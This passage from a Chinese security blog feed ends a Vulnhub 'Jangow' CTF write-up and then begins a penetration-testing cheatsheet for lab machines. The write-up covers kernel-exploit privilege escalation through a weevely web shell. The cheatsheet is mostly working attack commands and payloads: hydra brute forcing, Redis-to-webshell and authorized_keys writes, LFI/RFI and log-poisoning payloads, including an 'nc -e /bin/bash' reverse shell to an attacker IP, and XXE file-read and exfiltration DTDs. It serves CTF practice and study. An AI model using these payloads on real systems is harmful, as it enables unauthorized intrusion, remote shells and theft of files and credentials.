class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;desafio02&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;desafio02&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;abygurl69&quot;</span>;</span><br><span class="line"><span class="comment">// Create connection</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>cat /etc/passwd | grep home</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">jangow01:x:1000:1000:desafio02,,,:&#x2F;home&#x2F;jangow01:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>netstat里面看见了SSH，但是连不上，估计是配iptables了</p><p>在Virtualbox中登录（偷看WP的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jangow01</span><br><span class="line">abygurl69</span><br></pre></td></tr></table></figure><p>逛一圈后没看见什么有价值的信息</p><p><code>uname -a</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux jangow01 4.4.0-31-generic <span class="comment">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a></p></blockquote><p>文件保存到本地</p><p>编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure><p>weevely中上传并赋权</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:file_upload ./exp /tmp/exp</span><br><span class="line">chmod +x /tmp/exp</span><br></pre></td></tr></table></figure><p>VirtualBox终端中jangow01用户运行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/exp</span><br></pre></td></tr></table></figure><p><code>cat /root/proof.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">                       @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                          </span><br><span class="line">                       @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    &#x2F;&amp;@@@@@@@@@@                          </span><br><span class="line">                       @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((&#x2F;&#x2F;#&amp;@@@&amp;   .&amp;@@@@@                          </span><br><span class="line">                       @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   .&#x2F;@@*   &amp;@@                          </span><br><span class="line">                       @  @@@@@* (@@@@@@@@@#&#x2F;.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;                    </span><br><span class="line">                       @  @@@, &#x2F;@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;                    </span><br><span class="line">                       @  @&amp;  @@@@@@@@#.         @@@,@@@&#x2F;           %.  #,   %@&amp;                    </span><br><span class="line">                       @@@#  @@@@@@@@&#x2F;         .@@@@@@@@@@            *  .,    @@                   </span><br><span class="line">                       @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @                   </span><br><span class="line">                       @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@                  </span><br><span class="line">                      @@&#x2F;  *@@@@@@@&#x2F;           @@@@@@@@@@@#                      @@                 </span><br><span class="line">                      @@   .@@@@@@@&#x2F;          @@@@@@@@@@@@@              @#      @@                 </span><br><span class="line">                      @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 </span><br><span class="line">                       @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  </span><br><span class="line">                       @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@                  </span><br><span class="line">                       @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@&#x2F;   &amp;@                   </span><br><span class="line">                       @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@                    </span><br><span class="line">                       @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;                    </span><br><span class="line">                       @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&#x2F;     &amp;@@&amp;&amp;                    </span><br><span class="line">                       @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#&#x2F;.      &amp;@@@@&amp;&amp;                    </span><br><span class="line">                       @  @@@@@@@@&amp;               JANGOW               &amp;@@@                          </span><br><span class="line">                       @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;                          </span><br><span class="line">                                     &amp;&amp;&amp;@@@@&amp;%       &amp;&#x2F;    (&amp;&amp;@@@&amp;&amp;&amp;                                </span><br><span class="line">                                       (((((((((((((((((((((((((((((</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br></pre></td></tr></table></figure><hr /><blockquote><p>网络问题</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">iptables -L</span><br><span class="line">...</span><br><span class="line">Chain ufw-user-forward (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-input (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ftp</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:http</span><br><span class="line"></span><br><span class="line">Chain ufw-user-limit (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">LOG        all  --  anywhere             anywhere             limit: avg 3&#x2F;min burst 5 LOG level warning prefix &quot;[UFW LIMIT BLOCK] &quot;</span><br><span class="line">REJECT     all  --  anywhere             anywhere             reject-with icmp-port-unreachable</span><br><span class="line"></span><br><span class="line">Chain ufw-user-limit-accept (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain ufw-user-logging-forward (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-logging-input (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-logging-output (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-output (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:https</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:https</span><br></pre></td></tr></table></figure><p>配置iptable来Ban掉反弹Shell倒是第一次见，在这上面也确实浪费了一些时间</p><blockquote><p>有SSH不用非要用VirtualBox终端登录</p></blockquote><p>非常规，有点整活</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">localectl</span><br><span class="line">   System Locale: LANG&#x3D;pt_BR.UTF-8</span><br><span class="line">                  LANGUAGE&#x3D;pt_BR:pt:en</span><br><span class="line">                  LC_NUMERIC&#x3D;pt_BR</span><br><span class="line">                  LC_TIME&#x3D;pt_BR</span><br><span class="line">                  LC_MONETARY&#x3D;pt_BR</span><br><span class="line">                  LC_PAPER&#x3D;pt_BR</span><br><span class="line">                  LC_NAME&#x3D;pt_BR</span><br><span class="line">                  LC_ADDRESS&#x3D;pt_BR</span><br><span class="line">                  LC_TELEPHONE&#x3D;pt_BR</span><br><span class="line">                  LC_MEASUREMENT&#x3D;pt_BR</span><br><span class="line">                  LC_IDENTIFICATION&#x3D;pt_BR</span><br><span class="line">       VC Keymap: n&#x2F;a</span><br><span class="line">      X11 Layout: br</span><br><span class="line">       X11 Model: a4techKB21</span><br></pre></td></tr></table></figure><p>但是比上次的西语键盘好摁点</p><p>参考资料</p><blockquote><p><a href="https://resources.infosecinstitute.com/topic/jangow-1-0-1-ctf-walkthrough/">WP</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;Vulnhub年靶机数量&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;Year&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;Num&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;…&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;…&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2018&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;65&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2019&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;117&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2020&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;223&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2021&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;108&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2022&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;难免对于一个时代的落幕感到惋惜&lt;/p&gt;
&lt;p&gt;但同时庆幸自己能够在最好的时间参与其中&lt;/p&gt;
&lt;p&gt;在学习的过程中享受这个过程&lt;/p&gt;
&lt;p&gt;Thank you, Vulnhub &amp;amp; every author.&lt;/p&gt;
&lt;p&gt;Thank you for what I learned and every wonderful challenge I enjoyed.&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Vulnhub" scheme="https://yoloyolo.top/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>靶机渗透手册</title>
    <link href="https://yoloyolo.top/2023/02/08/Box-Hacking-Cheatsheet/"/>
    <id>https://yoloyolo.top/2023/02/08/Box-Hacking-Cheatsheet/</id>
    <published>2023-02-08T03:15:20.000Z</published>
    <updated>2023-07-22T07:40:51.094Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="靶机渗透手册"><a class="markdownIt-Anchor" href="#靶机渗透手册"></a> 靶机渗透手册</h1><p><code>2020/10/28 21:19:49</code></p><h2 id="情报收集"><a class="markdownIt-Anchor" href="#情报收集"></a> 情报收集</h2><h3 id="实际渗透"><a class="markdownIt-Anchor" href="#实际渗透"></a> 实际渗透</h3><ul><li><a href="https://www.freebuf.com/articles/database/195169.html">全流程信息收集方法总结</a></li><li><a href="https://www.freebuf.com/articles/web/204883.html">渗透测试信息收集心得分享</a></li></ul><h3 id="靶机渗透"><a class="markdownIt-Anchor" href="#靶机渗透"></a> 靶机渗透</h3><h4 id="查找ip"><a class="markdownIt-Anchor" href="#查找ip"></a> 查找IP</h4><ul><li>主办方给出(比赛)</li><li>netdiscover</li><li>路由器查看主机IP(桥接且需权限)</li><li>根据虚拟机IP分布，用浏览器逐个访问IP(仅限存在WEB服务，不推荐)</li><li><code>nmap -sn -T5 192.168.0.1/24 | grep -B2 -E &quot;(virtual|VMware)&quot;</code>(虚拟机的MAC地址)</li><li><code>arp-scan -l</code></li></ul><h4 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h4><ul><li><code>nmap -p 1-65535 -sV -v -T5 -n 192.168.0.1</code></li><li>-Pn 扫不到Redis，有时候漏了这个信息很难受</li></ul><h4 id="web路径"><a class="markdownIt-Anchor" href="#web路径"></a> Web路径</h4><ul><li><code>dirb http://192.168.0.1/ -w</code></li><li><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -u http://192.168.0.1/</code></li></ul><h4 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h4><p><code>wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://flight.htb&quot; -H &quot;Host: FUZZ.flight.htb&quot; --hl 154</code></p><h4 id="smb信息枚举"><a class="markdownIt-Anchor" href="#smb信息枚举"></a> SMB信息枚举</h4><ul><li><code>enum4linux 192.168.0.1</code></li><li><a href="https://github.com/cddmp/enum4linux-ng">https://github.com/cddmp/enum4linux-ng</a></li></ul><h4 id="wordpress"><a class="markdownIt-Anchor" href="#wordpress"></a> Wordpress</h4><ul><li>Username: <code>wpscan --url http://192.168.0.1/ -e u</code></li><li>Password: <code>wpscan --url http://192.168.0.1/ --username --wordlist /usr/share/wordlists/rockyou.txt</code></li><li>Plugins: <code>wpscan --url http://192.168.0.1/ --enumerate ap --plugins-detection aggressive</code></li><li>Themes: <code>wpscan --url http://192.168.0.1/ --enumerate at --themes-detection aggressive</code></li></ul><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><h3 id="ssh弱口令"><a class="markdownIt-Anchor" href="#ssh弱口令"></a> SSH弱口令</h3><p><code>hydra -V -I -f -t 64 -L user -P pass ssh://192.168.0.1:22</code></p><h3 id="ftp匿名登入"><a class="markdownIt-Anchor" href="#ftp匿名登入"></a> FTP匿名登入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.1</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure><ul><li>FTP Banner</li></ul><h3 id="smb弱口令"><a class="markdownIt-Anchor" href="#smb弱口令"></a> SMB弱口令</h3><p><code>enum4limux 192.168.0.1</code><br /><code>hydra -L user -P pass -I -e n smb://192.168.0.1</code><br /><code>smbmap -H 192.168.0.1</code><br /><code>smbclient //192.168.0.1/dir -U username</code></p><h3 id="nfs目录挂载"><a class="markdownIt-Anchor" href="#nfs目录挂载"></a> NFS目录挂载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 111 --script nfs* 192.168.0.1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br><span class="line">vim /etc/exports</span><br><span class="line">/share1 *(sync,ro) 192.168.0.1(sync,rw)</span><br><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br><span class="line">showmount -e 192.168.0.1</span><br><span class="line">Export list <span class="keyword">for</span> 192.168.0.1:</span><br><span class="line">/home/peter *</span><br><span class="line">mkdir /mnt/share1</span><br><span class="line">mount -t nfs 192.168.0.1:/home/peter /mnt/share1</span><br><span class="line"><span class="built_in">cd</span> /mnt/share1</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><h3 id="web认证"><a class="markdownIt-Anchor" href="#web认证"></a> Web认证</h3><ul><li>Web页面内容生成字典 : <code>cewl http://192.168.31.39/websec -w pass</code></li><li>hydra-post-form : <code>hydra -I -l contact@hacknos.com -P FuzzDicts-master/passwordDict/top6000.txt -vV -f 192.168.31.39 http-post-form &quot;/websec/login:username=^USER^&amp;password=^PASS^:Wrong&quot;</code></li><li>JWT : <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSJ9.Xjc37g2j_pU5SFHYwoPSHWJDEmRVPtfHkbFfGPcn4W0</span><br><span class="line">pip install pyjwt</span><br><span class="line">python</span><br><span class="line">&gt;&gt;&gt; import jwt</span><br><span class="line">&gt;&gt;&gt; jwt.encode(&#123;&#39;username&#39;: &#39;admin&#39;&#125;, &#39;1Kun&#39;, algorithm&#x3D;&#39;HS256&#39;)</span><br><span class="line">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo&#39;</span><br></pre></td></tr></table></figure><ul><li>HTTP-Basic认证<ul><li>配合Burp的Intruder模块</li><li>字典生成脚本</li><li>.htaccess (Apache2)</li><li>.htpasswd (Apache2)</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">raw = [ </span><br><span class="line"><span class="string">&#x27;Recon&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Web&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Service&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Blog&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;hackNos&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;TroubleShoot&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Security&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Recon Security&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Secure&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5ecure&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Secure@hackNos&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Security@hackNos&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> raw:</span><br><span class="line"><span class="built_in">print</span> base64.b64encode(j + <span class="string">&#x27;:&#x27;</span> + i)</span><br></pre></td></tr></table></figure><h3 id="ldap"><a class="markdownIt-Anchor" href="#ldap"></a> LDAP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.1 -p 389 --script ldap-search --script-args <span class="string">&#x27;ldap.username=&quot;cn=admin,dc=admin,dc=local&quot;,ldap.password=password&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="redis未授权"><a class="markdownIt-Anchor" href="#redis未授权"></a> Redis未授权</h3><ul><li>PHP</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> webshell <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><ul><li>SSH</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/.ssh/id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;cat ~/.ssh/id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; new.txt</span><br><span class="line">redis-cli -h 192.168.0.1 flushall</span><br><span class="line">cat new.txt | redis-cli -h 1192.168.0.1 -x <span class="built_in">set</span> crackit</span><br><span class="line">redis-cli -h 192.168.0.1 config <span class="built_in">set</span> dir /var/lib/redis/.ssh/</span><br><span class="line">redis-cli -h 192.168.0.1 config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">redis-cli -h 192.168.0.1 save</span><br><span class="line">ssh -i /root/.ssh/id_rsa redis@192.168.0.1</span><br></pre></td></tr></table></figure><h3 id="file_includsion"><a class="markdownIt-Anchor" href="#file_includsion"></a> FILE_Includsion</h3><ul><li>LFI</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><ul><li>RFI</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;192.168.0.2&#x2F;bfl</span><br></pre></td></tr></table></figure><ul><li>SMTP</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.0.1 25</span><br><span class="line">MAIl FROM: &lt;Hacker&gt;</span><br><span class="line">RCPT TO: Username</span><br><span class="line">data</span><br><span class="line">&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br><span class="line">~~~~~</span><br><span class="line">&#x2F;index.php?file&#x3D;&#x2F;var&#x2F;mail&#x2F;Username&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.0.2 8081</span><br></pre></td></tr></table></figure><ul><li>SSH</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#39;&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;&#39;@192.168.0.1</span><br><span class="line">file.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;pass&#x3D;ls</span><br></pre></td></tr></table></figure><ul><li>PHP Filter Chain</li></ul><blockquote><p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p></blockquote><h3 id="xxe"><a class="markdownIt-Anchor" href="#xxe"></a> XXE</h3><p>LFI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; %xxe; ]&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;file:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;&gt; %xxe; ]&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt; %xxe; ]&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;&gt; %xxe; ]&gt;</span><br></pre></td></tr></table></figure><p>SSRF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;10.10.*.*&#x2F;BFL&quot;&gt; %xxe; ]&gt;</span><br></pre></td></tr></table></figure><p>LFI+SSRF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;10.10.*.*&#x2F;bfl.dtd&quot;&gt; %xxe;]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;tmp&#x2F;bfl.dtd</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 